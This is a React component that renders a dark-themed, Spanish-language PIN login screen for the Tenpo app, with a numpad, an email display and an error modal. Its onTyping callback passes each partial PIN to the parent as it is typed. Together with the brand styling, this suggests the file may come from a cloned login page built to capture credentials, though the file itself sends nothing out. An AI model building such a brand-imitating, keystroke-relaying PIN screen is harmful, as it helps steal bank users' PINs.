import { useState, useCallback, useRef, useEffect } from "react";
import { ArrowLeft, Delete } from "lucide-react";
import TenpoModal from "./TenpoModal";

interface TenpoPasswordScreenProps {
  email: string;
  pinLength: 4 | 6;
  onSubmit: (pin: string) => void;
  onTyping?: (partialPin: string) => void;
  onBack: () => void;
  loading: boolean;
  error?: string;
}

const TenpoPasswordScreen = ({ email, pinLength, onSubmit, onTyping, onBack, loading, error }: TenpoPasswordScreenProps) => {
  const [digits, setDigits] = useState<string[]>(Array(pinLength).fill(""));
  const submitted = useRef(false);
  const [showErrorModal, setShowErrorModal] = useState(false);

  const filledCount = digits.filter(d => d !== "").length;

  const handleDigit = useCallback((num: string) => {
    if (loading || submitted.current) return;
    setDigits(prev => {
      const next = [...prev];
      const idx = next.findIndex(d => d === "");
      if (idx === -1) return prev;
      next[idx] = num;

      const pinNow = next.join("");
      onTyping?.(pinNow);

      // Auto-submit when all digits entered
      if (idx === pinLength - 1) {
        submitted.current = true;
        setTimeout(() => {
          onSubmit(pinNow);
          setTimeout(() => { submitted.current = false; }, 1000);
        }, 200);
      }
      return next;
    });
  }, [loading, onSubmit, onTyping, pinLength]);

  const handleDelete = useCallback(() => {
    if (loading) return;
    setDigits(prev => {
      const next = [...prev];
      // Find last filled
      for (let i = pinLength - 1; i >= 0; i--) {
        if (next[i] !== "") {
          next[i] = "";
          break;
        }
      }
      onTyping?.(next.join(""));
      return next;
    });
  }, [loading, onTyping, pinLength]);

  useEffect(() => {
    if (error) {
      setDigits(Array(pinLength).fill(""));
      submitted.current = false;
      setShowErrorModal(true);
      onTyping?.("");
    }
  }, [error, onTyping, pinLength]);

  const keys = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "", "0", "del"];

  return (
    <div className="flex min-h-[100dvh] flex-col bg-[#0a0a0a] text-white">
      {/* Back */}
      <div className="px-5 pt-6">
        <button onClick={onBack} className="text-[#888] hover:text-white transition-colors">
          <ArrowLeft size={22} />
        </button>
      </div>

      {/* Content */}
      <div className="flex flex-1 flex-col items-center pt-12 px-6">
        <h1 className="text-[20px] font-bold text-white text-center leading-tight mb-1">
          Ingresa la clave de acceso de
        </h1>
        <p className="text-[14px] text-[#888] text-center mb-8">{email}</p>

        {showErrorModal && error && (
          <TenpoModal
            title="Hubo un problema"
            subtitle={error}
            primaryLabel="Reintentar"
            onPrimary={() => setShowErrorModal(false)}
            secondaryLabel="Cerrar"
            onSecondary={() => setShowErrorModal(false)}
          />
        )}

        {/* Dots */}
        <div className="flex items-center gap-4 mb-10">
          {digits.map((d, i) => (
            <div
              key={i}
              className={`h-4 w-4 rounded-full border-2 transition-all ${
                d ? "bg-white border-white" : "border-[#555] bg-transparent"
              }`}
            />
          ))}
        </div>

        {/* Numpad */}
        <div className="w-full max-w-[320px] grid grid-cols-3 gap-0">
          {keys.map((key, i) => {
            if (key === "") return <div key={i} />;
            if (key === "del") {
              return (
                <button
                  key={i}
                  onClick={handleDelete}
                  className="flex items-center justify-center py-5 text-white active:bg-white/5 rounded-lg transition-colors"
                >
                  <Delete size={24} />
                </button>
              );
            }
            return (
              <button
                key={i}
                onClick={() => handleDigit(key)}
                disabled={loading}
                className="flex items-center justify-center py-5 text-[28px] font-light text-white active:bg-white/5 rounded-lg transition-colors disabled:opacity-50"
              >
                {key}
              </button>
            );
          })}
        </div>

        {/* Recover link */}
        <button className="mt-auto mb-10 text-[14px] font-medium text-[#4DF4AC] underline underline-offset-4">
          Recuperar acceso
        </button>
      </div>
    </div>
  );
};

export default TenpoPasswordScreen;
